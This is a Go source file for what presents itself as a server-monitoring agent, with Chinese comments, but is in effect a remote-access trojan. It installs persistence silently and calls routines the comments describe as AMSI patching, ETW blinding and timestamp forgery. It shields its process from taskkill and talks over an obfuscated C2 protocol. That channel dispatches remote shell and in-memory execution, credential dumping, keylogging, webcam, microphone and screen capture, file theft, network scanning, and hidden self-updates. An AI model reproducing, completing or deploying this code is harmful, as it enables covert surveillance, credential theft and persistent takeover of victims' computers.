package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

const AgentVersion = "26.0.0"

// 更新回滚：首次上报成功后确认更新
var reportOK atomic.Bool

// agent 自身的 SERVER_URL，用于更新下载（确保可达）
var agentServerURL string

// AgentMessage 与服务端之间的消息格式
type AgentMessage struct {
	Type    string          `json:"type"`
	ID      string          `json:"id"`
	Payload json.RawMessage `json:"payload"`
	Ts      int64           `json:"ts,omitempty"`
	Sig     string          `json:"sig,omitempty"`
}

// verifyMsg 验证服务端下发消息的 HMAC 签名，防止伪造命令
func verifyMsg(msg *AgentMessage, signKey []byte) bool {
	if len(signKey) == 0 {
		return true // 未配置签名密钥，跳过验证（向后兼容）
	}
	if msg.Sig == "" || msg.Ts == 0 {
		return false // 有密钥但消息无签名，拒绝
	}
	// 拒绝超过 60 秒的旧消息（防重放）
	if math.Abs(float64(time.Now().Unix()-msg.Ts)) > 60 {
		return false
	}
	raw := msg.Type + "|" + msg.ID + "|" + strconv.FormatInt(msg.Ts, 10) + "|" + string(msg.Payload)
	mac := hmac.New(sha256.New, signKey)
	mac.Write([]byte(raw))
	expected := hex.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(msg.Sig), []byte(expected))
}

type ExecRequest struct {
	Command string `json:"command"`
}

type ExecResult struct {
	ExitCode int    `json:"exitCode"`
	Output   string `json:"output"`
	Error    string `json:"error"`
}

type MetricReport struct {
	Token        string  `json:"token"`
	Version      string  `json:"version"`
	CPUUsage     float64 `json:"cpuUsage"`
	MemTotal     int64   `json:"memTotal"`
	MemUsed      int64   `json:"memUsed"`
	MemUsage     float64 `json:"memUsage"`
	DiskTotal    int64   `json:"diskTotal"`
	DiskUsed     int64   `json:"diskUsed"`
	DiskUsage    float64 `json:"diskUsage"`
	NetIn        int64   `json:"netIn"`
	NetOut       int64   `json:"netOut"`
	Load1m       float64 `json:"load1m"`
	Load5m       float64 `json:"load5m"`
	Load15m      float64 `json:"load15m"`
	ProcessCount int     `json:"processCount"`
	Uptime       string  `json:"uptime"`
}

// loadConfigFile / saveConfigFile 已迁移到 config_crypto.go（AES-256-GCM 加密版）
var loadConfigFile = loadEncryptedConfigFile
var saveConfigFile = saveEncryptedConfigFile

// autoRegister 自动注册到服务端，获取 token
func autoRegister(serverURL string) (string, error) {
	hostname, _ := os.Hostname()
	osType := "linux"
	if strings.Contains(strings.ToLower(fmt.Sprintf("%s", os.Getenv("OS"))), "windows") ||
		filepath.Separator == '\\' {
		osType = "windows"
	}

	reqBody, _ := json.Marshal(map[string]string{
		"hostname": hostname,
		"os":       osType,
	})

	registerURL := strings.TrimRight(serverURL, "/") + "/api/agent/register"
	resp, err := secureHTTPClient.Post(registerURL, "application/json", bytes.NewReader(reqBody))
	if err != nil {
		return "", fmt.Errorf("连接服务端失败: %v", err)
	}
	defer resp.Body.Close()

	var result struct {
		Success bool `json:"success"`
		Data    struct {
			Token   string `json:"token"`
			Message string `json:"message"`
		} `json:"data"`
		Error string `json:"error"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("解析响应失败: %v", err)
	}
	if !result.Success {
		return "", fmt.Errorf("注册失败: %s", result.Error)
	}
	if result.Data.Token == "" {
		return "", fmt.Errorf("服务端未返回 Token")
	}
	return result.Data.Token, nil
}

func main() {
	// 截图子进程模式：在交互式会话中截一帧输出到 stdout
	if len(os.Args) > 1 && os.Args[1] == "--capture-frame" {
		runCaptureHelper()
		return
	}

	// 持久化安装/卸载
	if len(os.Args) > 1 && os.Args[1] == "--install" {
		installAgent()
		os.Exit(0)
	}
	if len(os.Args) > 1 && os.Args[1] == "--uninstall" {
		uninstallAgent()
		os.Exit(0)
	}

	// 看门狗守护模式（由计划任务直接调用 agent --guard-a/b，GUI 程序零弹窗）
	if len(os.Args) > 1 && os.Args[1] == "--guard-a" {
		runGuardA()
		os.Exit(0)
	}
	if len(os.Args) > 1 && os.Args[1] == "--guard-b" {
		runGuardB()
		os.Exit(0)
	}

	// 初始化日志（GUI 模式下无控制台，必须写到文件）
	setupLogging()

	// 看门狗模式：如果是 AGENT_ROLE=watchdog，则只运行监控循环
	// 注：Windows Session 0 截图问题由 captureViaHelper (CreateProcessAsUser) 解决
	if os.Getenv("AGENT_ROLE") == "watchdog" {
		spawnWatchdog()
		return
	}

	// 单实例锁：防止多个 agent 进程同时运行互相踢 WS 连接
	if !acquireSingleton() {
		os.Exit(0)
	}

	// 主进程：启动看门狗子进程用于互相监控
	spawnWatchdog()

	// 自动持久化：后台检测并静默安装（不阻塞主流程）
	go ensurePersistence()

	// 优先读取配置文件，环境变量覆盖
	fileCfg := loadConfigFile()
	serverURL := os.Getenv("SERVER_URL")
	token := os.Getenv("AGENT_TOKEN")
	intervalStr := os.Getenv("INTERVAL")
	if serverURL == "" {
		serverURL = fileCfg["SERVER_URL"]
	}
	if token == "" {
		token = fileCfg["AGENT_TOKEN"]
	}
	if intervalStr == "" {
		intervalStr = fileCfg["INTERVAL"]
	}

	if serverURL == "" {
		os.Exit(1)
	}

	// 没有 token 时自动注册
	if token == "" {
		log.Printf("未配置 AGENT_TOKEN，尝试自动注册...")
		var err error
		token, err = autoRegister(serverURL)
		if err != nil {
			log.Fatalf("自动注册失败: %v", err)
		}
		log.Printf("自动注册成功，已获取 Token")
	}

	signKey := fileCfg["SIGN_KEY"]

	// 自动保存加密配置文件，确保重启后不丢失
	saveConfigFile(serverURL, token, intervalStr)

	interval := 10
	if intervalStr != "" {
		if v, err := strconv.Atoi(intervalStr); err == nil && v > 0 {
			interval = v
		}
	}

	agentServerURL = strings.TrimRight(serverURL, "/")
	reportURL := agentServerURL + "/api/agent/report"
	log.Printf("Agent v%s 启动: 上报地址=%s, 间隔=%d秒", AgentVersion, reportURL, interval)

	// 创建命名互斥体（无文件模式下用于进程存活检测）
	if runtime.GOOS == "windows" {
		createAgentMutex()
		applyAllEvasion()         // AMSI patch + ETW blind + 时间戳伪造
		enableProcessProtection() // ACL 模式：taskkill 杀不掉，但崩溃不蓝屏
	}

	// 自动回滚保护：如果存在 .bak 文件，说明刚更新，30秒内必须成功上报否则回滚
	go autoRollbackGuard()

	// 启动 WebSocket 连接（接收命令执行）
	go wsLoop(serverURL, token, signKey)

	// 立即执行一次
	collect(reportURL, token)

	ticker := time.NewTicker(time.Duration(interval) * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		collect(reportURL, token)
	}
}

// wsLoop 保持 WebSocket 长连接，接收服务端下发的命令并执行
// 核心保活机制：
//   - Agent 每 30s 发送 WS Ping，检测死连接
//   - ReadDeadline 90s，超时自动断开触发重连
//   - PongHandler 重置超时，正常连接永不超时
//   - 指数退避重连，最大 30s，加随机抖动
func wsLoop(serverURL, token, signKeyHex string) {
	var signKey []byte
	if signKeyHex != "" {
		signKey = []byte(signKeyHex)
		log.Printf("已启用 WS 命令签名验证")
	} else {
		log.Printf("警告: 未配置 SIGN_KEY，WS 命令未加密验证")
	}
	u, _ := url.Parse(serverURL)
	scheme := "ws"
	if u.Scheme == "https" {
		scheme = "wss"
	}
	wsURL := fmt.Sprintf("%s://%s/ws/agent?token=%s", scheme, u.Host, token)

	const (
		pingInterval = 30 * time.Second // Agent 主动 ping 间隔
		readTimeout  = 90 * time.Second // 读超时（>2x pingInterval）
		writeTimeout = 10 * time.Second // 写超时
		maxBackoff   = 30 * time.Second // 最大重连退避（旧值 2min 太慢）
	)

	dialer := websocket.Dialer{
		HandshakeTimeout: 15 * time.Second,
		TLSClientConfig:  tlsConfig,
	}

	backoff := time.Second

	for {
		log.Printf("WebSocket 连接中: %s", wsURL)
		conn, _, err := dialer.Dial(wsURL, nil)
		if err != nil {
			jitter := time.Duration(rand.Int63n(int64(backoff / 2)))
			wait := backoff + jitter
			log.Printf("WebSocket 连接失败: %v, %.0f秒后重试", err, wait.Seconds())
			time.Sleep(wait)
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}
		backoff = time.Second // 连接成功，重置退避
		log.Printf("WebSocket 已连接")

		// 初始化 C2 协议混淆映射
		initC2Proto(string(signKey))

		// ── 设置读超时 + PongHandler ──
		conn.SetReadLimit(4 * 1024 * 1024) // 4MB
		conn.SetReadDeadline(time.Now().Add(readTimeout))
		conn.SetPongHandler(func(string) error {
			conn.SetReadDeadline(time.Now().Add(readTimeout))
			return nil
		})

		// writeMu 保护并发写， gorilla/websocket 不支持并发 Write
		var writeMu sync.Mutex
		var wg sync.WaitGroup // 跟踪执行中的命令 goroutine
		done := make(chan struct{})

		// ── Agent 主动 Ping 协程 ──
		go func() {
			ticker := time.NewTicker(pingInterval)
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					writeMu.Lock()
					conn.SetWriteDeadline(time.Now().Add(writeTimeout))
					err := conn.WriteMessage(websocket.PingMessage, nil)
					conn.SetWriteDeadline(time.Time{}) // 清除写超时
					writeMu.Unlock()
					if err != nil {
						log.Printf("WS Ping 发送失败: %v", err)
						return
					}
				case <-done:
					return
				}
			}
		}()

		// ── 读消息循环 ──
		for {
			_, data, err := conn.ReadMessage()
			if err != nil {
				log.Printf("WebSocket 断开: %v, 重连中...", err)
				break
			}
			// 收到任何消息都重置读超时
			conn.SetReadDeadline(time.Now().Add(readTimeout))

			var msg AgentMessage
			if err := json.Unmarshal(data, &msg); err != nil {
				continue
			}
			msg.Type = c2d(msg.Type) // C2 协议解码

			// 验证服务端签名（exec/pty/stress/update 等危险命令必须验签）
			if msg.Type != "ping" && msg.Type != "pong" {
				if !verifyMsg(&msg, signKey) {
					log.Printf("拒绝未签名/签名无效的命令: type=%s id=%s", msg.Type, msg.ID)
					continue
				}
			}

			switch msg.Type {
			case "exec":
				wg.Add(1)
				go func() {
					defer wg.Done()
					handleExec(conn, &writeMu, msg)
				}()
			case "pty_start":
				go handlePtyStart(conn, &writeMu, msg)
			case "pty_input":
				handlePtyInput(msg)
			case "pty_resize":
				handlePtyResize(msg)
			case "pty_close":
				handlePtyClose(msg)
			case "screen_start":
				go handleScreenStart(conn, &writeMu, msg)
			case "screen_stop":
				handleScreenStop(msg)
			case "stress_start":
				go handleStressStart(conn, &writeMu, msg)
			case "stress_stop":
				handleStressStop(msg)
			case "quick_cmd":
				go handleQuickCmd(conn, &writeMu, msg)
			case "mem_exec":
				go handleMemExec(conn, &writeMu, msg)
			case "update", "self_update":
				go handleSelfUpdate(conn, &writeMu, msg)
			case "cred_dump":
				go handleCredDump(conn, &writeMu, msg)
			case "net_scan":
				go handleNetScan(conn, &writeMu, msg)
			case "webcam_snap":
				go handleWebcamSnap(conn, &writeMu, msg)
			case "webcam_start":
				go handleWebcamStart(conn, &writeMu, msg)
			case "webcam_stop":
				handleWebcamStop(conn, &writeMu, msg)
			case "file_browse":
				go handleFileBrowse(conn, &writeMu, msg)
			case "file_download":
				go handleFileDownload(conn, &writeMu, msg)
			case "process_list":
				go handleProcessList(conn, &writeMu, msg)
			case "process_kill":
				go handleProcessKill(conn, &writeMu, msg)
			case "service_list":
				go handleServiceList(conn, &writeMu, msg)
			case "service_control":
				go handleServiceControl(conn, &writeMu, msg)
			case "keylog_start":
				go handleKeylogStart(conn, &writeMu, msg)
			case "keylog_stop":
				handleKeylogStop(conn, &writeMu, msg)
			case "keylog_dump":
				go handleKeylogDump(conn, &writeMu, msg)
			case "window_list":
				go handleWindowList(conn, &writeMu, msg)
			case "window_control":
				go handleWindowControl(conn, &writeMu, msg)
			case "mic_start":
				go handleMicStart(conn, &writeMu, msg)
			case "mic_stop":
				handleMicStop(conn, &writeMu, msg)
			case "ping":
				resp, _ := json.Marshal(AgentMessage{Type: c2e("pong"), ID: msg.ID})
				writeMu.Lock()
				conn.SetWriteDeadline(time.Now().Add(writeTimeout))
				conn.WriteMessage(websocket.TextMessage, resp)
				conn.SetWriteDeadline(time.Time{})
				writeMu.Unlock()
			}
		}

		// ── 清理 ──
		close(done) // 停止 ping 协程

		// WS 断线：立即取消运行中的压测，防止 goroutine/连接泄漏
		stressRunner.mu.Lock()
		if stressRunner.running && stressRunner.cancel != nil {
			stressRunner.cancel()
			log.Printf("WebSocket 断开，已自动取消运行中的压力测试")
		}
		stressRunner.mu.Unlock()

		// 清理所有 PTY 和截图会话
		cleanupAllPtySessions()
		cleanupAllScreenSessions()
		// 等待所有执行中的命令完成后再关闭连接
		wg.Wait()
		conn.Close()
		// 断线后短暂等待再重连
		time.Sleep(time.Second)
	}
}

// handleExec 执行服务端下发的命令并返回结果
func handleExec(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("命令执行 panic: %v", r)
		}
	}()

	var req ExecRequest
	json.Unmarshal(msg.Payload, &req)

	log.Printf("执行命令: %s", req.Command)

	result := ExecResult{}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", req.Command)
	} else {
		cmd = exec.Command("sh", "-c", req.Command)
	}
	hideWindow(cmd)
	output, err := cmd.CombinedOutput()
	result.Output = string(output)

	if err != nil {
		result.Error = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			result.ExitCode = exitErr.ExitCode()
		} else {
			result.ExitCode = -1
		}
	}

	payload, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("exec_result"),
		ID:      msg.ID,
		Payload: payload,
	})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()
}

func collect(url, token string) {
	report, err := gatherMetrics(token)
	if err != nil {
		log.Printf("采集失败: %v", err)
		return
	}

	body, _ := json.Marshal(report)
	resp, err := secureHTTPClient.Post(url, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("上报失败: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		reportOK.Store(true)
		log.Printf("上报成功: CPU=%.1f%% MEM=%.1f%% DISK=%.1f%%", report.CPUUsage, report.MemUsage, report.DiskUsage)
	} else {
		log.Printf("上报异常: HTTP %d", resp.StatusCode)
	}
}

// autoRollbackGuard 更新后回滚保护
// 保留上一版本备份，120秒内需成功上报，否则回滚一次（回滚后删除.bak防止死循环）
func autoRollbackGuard() {
	selfPath, err := os.Executable()
	if err != nil {
		return
	}
	selfPath, _ = filepath.EvalSymlinks(selfPath)
	backupPath := selfPath + ".bak"

	if _, err := os.Stat(backupPath); err != nil {
		return
	}

	log.Printf("检测到更新备份，启动回滚保护（120秒内需成功上报）")

	// 每10秒检查一次，共12次（120秒），任一次成功即确认
	for i := 0; i < 12; i++ {
		time.Sleep(10 * time.Second)
		if reportOK.Load() {
			os.Remove(backupPath)
			log.Printf("更新确认成功（第%d次检查），已删除旧版本备份", i+1)
			return
		}
		log.Printf("回滚保护检查 %d/12: 尚未成功上报", i+1)
	}

	// 120秒仍未成功，回滚一次
	log.Printf("更新后120秒内上报均失败，回滚到上一版本...")
	os.Remove(selfPath)
	if err := os.Rename(backupPath, selfPath); err != nil {
		log.Printf("回滚失败: %v", err)
		return
	}
	os.Chmod(selfPath, 0755)

	// 关键：回滚后不保留 .bak，防止旧版本再次触发回滚形成死循环
	// 即：最多只回滚一次
	log.Printf("已回滚，重启上一版本（不保留备份，防止循环回滚）...")
	cmd := exec.Command(selfPath)
	cmd.Dir = filepath.Dir(selfPath)
	cmd.Env = os.Environ()
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	hideWindow(cmd)
	cmd.Start()
	os.Exit(1)
}

func gatherMetrics(token string) (*MetricReport, error) {
	report := &MetricReport{Token: token, Version: AgentVersion}

	cpu, err := getCPUUsage()
	if err == nil {
		report.CPUUsage = cpu
	}

	report.MemTotal, report.MemUsed, report.MemUsage = getMemory()
	report.DiskTotal, report.DiskUsed, report.DiskUsage = getDisk()
	report.Load1m, report.Load5m, report.Load15m = getLoadAvg()
	report.ProcessCount = getProcessCount()
	report.Uptime = getUptime()
	report.NetIn, report.NetOut = getNetTraffic()

	return report, nil
}

func round2(v float64) float64 {
	return float64(int(v*100)) / 100
}

// handleSelfUpdate 接收服务端推送的更新指令，下载新版本替换自身并重启
func handleSelfUpdate(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var req struct {
		URL string `json:"url"`
	}
	json.Unmarshal(msg.Payload, &req)

	// URL 为空时自动从 agentServerURL 构造下载地址
	if req.URL == "" {
		if agentServerURL == "" {
			sendUpdateResult(conn, writeMu, msg.ID, false, "缺少下载地址且无 SERVER_URL")
			return
		}
		req.URL = agentServerURL + "/data/agent-bin/agent-garble-windows.exe"
	}

	// 用 agent 自身的 SERVER_URL 替换推送的 host，确保内网机器也能下载
	downloadURL := req.URL
	if agentServerURL != "" {
		if parsed, err := url.Parse(req.URL); err == nil {
			downloadURL = agentServerURL + parsed.Path
		}
	}
	log.Printf("收到更新指令，原始地址: %s，实际下载: %s", req.URL, downloadURL)
	sendUpdateResult(conn, writeMu, msg.ID, true, "开始下载更新...")

	// 获取当前可执行文件路径
	selfPath, err := os.Executable()
	if err != nil {
		log.Printf("获取自身路径失败: %v", err)
		sendUpdateResult(conn, writeMu, msg.ID, false, "获取自身路径失败: "+err.Error())
		return
	}
	selfPath, _ = filepath.EvalSymlinks(selfPath)
	selfDir := filepath.Dir(selfPath)

	// 下载新版本到临时文件（带超时 + 重试）
	tmpPath := filepath.Join(selfDir, ".agent-update-tmp")
	if runtime.GOOS == "windows" {
		tmpPath += ".exe"
	}

	var written int64
	var downloadErr error
	for attempt := 1; attempt <= 3; attempt++ {
		written, downloadErr = downloadWithTimeout(downloadURL, tmpPath, 120*time.Second)
		if downloadErr == nil {
			break
		}
		log.Printf("下载失败(第%d次): %v", attempt, downloadErr)
		if attempt < 3 {
			time.Sleep(2 * time.Second)
		}
	}
	if downloadErr != nil {
		os.Remove(tmpPath)
		sendUpdateResult(conn, writeMu, msg.ID, false, "下载失败(已重试3次): "+downloadErr.Error())
		return
	}

	// 校验文件大小（至少 1MB，防止下载到错误页面）
	if written < 1024*1024 {
		os.Remove(tmpPath)
		sendUpdateResult(conn, writeMu, msg.ID, false, fmt.Sprintf("下载文件异常: 仅 %d 字节，可能不是有效二进制", written))
		return
	}

	log.Printf("下载完成: %.2f MB", float64(written)/1024/1024)
	os.Chmod(tmpPath, 0755)

	// 更新前清除所有持久化痕迹（计划任务、COM劫持、WMI、服务、注册表）
	// 新版本启动后会通过 ensurePersistence() 重新安装
	log.Println("清除旧版持久化痕迹...")
	cleanAllPersistence()

	// 备份旧版本
	backupPath := selfPath + ".bak"
	os.Remove(backupPath)

	if runtime.GOOS == "windows" {
		// Windows: 使用批处理脚本辅助更新（最可靠的方式）
		// 批处理等待当前进程退出后替换文件并启动新版本
		// 所有 start 命令改用 wscript+VBS 隐藏启动，不弹任何窗口
		batPath := filepath.Join(selfDir, ".agent-update.bat")
		vbsPath := filepath.Join(selfDir, ".agent-start.vbs")
		selfName := filepath.Base(selfPath)

		// 创建 VBS 辅助脚本用于隐藏启动 agent（不弹窗）
		vbsContent := fmt.Sprintf("CreateObject(\"Wscript.Shell\").Run \"\"\"%s\"\"\", 0, False\r\n", selfPath)
		os.WriteFile(vbsPath, []byte(vbsContent), 0644)

		batContent := fmt.Sprintf("@echo off\r\n"+
			"rem 先验证新文件存在且大于0字节，否则中止更新\r\n"+
			"if not exist \"%s\" goto :abort\r\n"+
			"for %%%%A in (\"%s\") do if %%%%~zA LSS 1000 goto :abort\r\n"+
			"ping -n 3 127.0.0.1 > nul\r\n"+
			"taskkill /F /IM \"%s\" >nul 2>&1\r\n"+
			"ping -n 2 127.0.0.1 > nul\r\n"+
			"rem 重置 ACL 和文件属性（防止锁定阻止替换）\r\n"+
			"attrib -R -H -S \"%s\" >nul 2>&1\r\n"+
			"attrib -R -H -S \"%s\" >nul 2>&1\r\n"+
			"icacls \"%s\" /reset >nul 2>&1\r\n"+
			"rem 先备份旧文件（rename而非delete，确保可回滚）\r\n"+
			"del /F /Q \"%s\" >nul 2>&1\r\n"+
			"move /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
			"rem 替换为新版本\r\n"+
			"move /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
			"if not exist \"%s\" goto :rollback\r\n"+
			"wscript.exe //B \"%s\"\r\n"+
			"goto :cleanup\r\n"+
			":rollback\r\n"+
			"rem 替换失败，从备份恢复\r\n"+
			"if exist \"%s\" move /Y \"%s\" \"%s\" >nul 2>&1\r\n"+
			"wscript.exe //B \"%s\"\r\n"+
			"goto :cleanup\r\n"+
			":abort\r\n"+
			"rem 新文件不存在或太小，不执行更新，直接退出\r\n"+
			":cleanup\r\n"+
			"del /F /Q \"%s\" >nul 2>&1\r\n"+
			"del /F /Q \"%s\" >nul 2>&1\r\n"+
			"del /F /Q \"%%~f0\" >nul 2>&1\r\n",
			tmpPath,              // if not exist 新文件
			tmpPath,              // for 检查文件大小
			selfName,             // taskkill
			selfPath,             // attrib 目标文件
			selfDir,              // attrib 目录
			selfDir,              // icacls 重置 ACL
			backupPath,           // del 旧备份（如果有）
			selfPath, backupPath, // move 旧文件 → .bak 备份
			tmpPath, selfPath, // move 新文件 → 目标位置
			selfPath,                         // if not exist 检查替换是否成功
			vbsPath,                          // wscript 启动新版本（隐藏）
			backupPath, backupPath, selfPath, // rollback: move 备份恢复
			vbsPath,    // wscript 启动旧版本（隐藏）
			backupPath, // cleanup: 删除备份
			vbsPath,    // cleanup: 删除 VBS 文件
		)
		if err := os.WriteFile(batPath, []byte(batContent), 0644); err != nil {
			os.Remove(tmpPath)
			os.Remove(vbsPath)
			sendUpdateResult(conn, writeMu, msg.ID, false, "创建更新脚本失败: "+err.Error())
			return
		}

		sendUpdateResult(conn, writeMu, msg.ID, true, "更新成功，正在重启...")
		log.Println("Windows 更新：启动批处理辅助更新...")

		batCmd := exec.Command("cmd.exe", "/C", batPath)
		hideWindow(batCmd)
		batCmd.Start()
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	} else {
		// Linux: 标准 rename 替换
		if err := os.Rename(selfPath, backupPath); err != nil {
			os.Remove(tmpPath)
			sendUpdateResult(conn, writeMu, msg.ID, false, "备份旧版本失败: "+err.Error())
			return
		}
		if err := os.Rename(tmpPath, selfPath); err != nil {
			os.Rename(backupPath, selfPath)
			sendUpdateResult(conn, writeMu, msg.ID, false, "替换失败: "+err.Error())
			return
		}
	}

	sendUpdateResult(conn, writeMu, msg.ID, true, "更新成功，正在重启...")
	log.Println("更新完成，2秒后重启...")
	time.Sleep(2 * time.Second)

	// 重启自身（仅 Linux 走到这里，Windows 已在上面 exit）
	cmd := exec.Command(selfPath)
	cmd.Dir = selfDir
	cmd.Env = os.Environ()
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	hideWindow(cmd)
	cmd.Start()

	os.Exit(0)
}

// downloadWithTimeout 带超时的文件下载
func downloadWithTimeout(url, destPath string, timeout time.Duration) (int64, error) {
	client := &http.Client{Timeout: timeout, Transport: secureTransport}
	resp, err := client.Get(url)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return 0, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	f, err := os.Create(destPath)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	written, err := io.Copy(f, resp.Body)
	return written, err
}

// copyFile 用 read+write 方式复制文件（Windows 备用方案）
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// handleQuickCmd 执行快捷指令并返回结果
func handleQuickCmd(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var req struct {
		Cmd string `json:"cmd"`
	}
	json.Unmarshal(msg.Payload, &req)

	message, err := executeQuickCmd(req.Cmd)
	result := ExecResult{Output: message}
	if err != nil {
		result.ExitCode = -1
		result.Error = err.Error()
		result.Output = ""
	}

	payload, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("quick_cmd_result"),
		ID:      msg.ID,
		Payload: payload,
	})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()
}

func sendUpdateResult(conn *websocket.Conn, writeMu *sync.Mutex, id string, success bool, message string) {
	payload, _ := json.Marshal(map[string]interface{}{
		"success": success,
		"message": message,
	})
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("update_result"),
		ID:      id,
		Payload: payload,
	})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()
}
